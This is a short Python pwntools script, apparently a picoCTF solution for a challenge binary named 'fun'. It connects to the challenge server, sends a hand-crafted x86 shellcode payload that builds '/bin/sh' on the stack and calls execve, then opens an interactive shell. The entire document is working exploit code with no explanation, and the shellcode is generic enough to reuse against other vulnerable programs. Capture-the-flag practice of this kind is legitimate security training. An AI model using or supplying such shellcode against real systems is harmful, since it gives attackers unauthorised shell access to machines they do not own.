#!/usr/bin/env python
import pwn
import sys

exe = pwn.ELF("./fun")
pwn.context.binary = exe
# io = pwn.process(exe.path)
io = pwn.remote("mercury.picoctf.net", 28494)

payload = b"j\x10\x90Y1\xc0\xb0h\xd3\xe0\xb4s\xb0/1\xdb\xb7n\xb3i\xd3\xe3\xb7b\xb3/PS1\xc01\xdb1\xc91\xd2\xb0\x0b\x89\xe3\xcd\x80"
io.sendline(payload)
io.interactive()
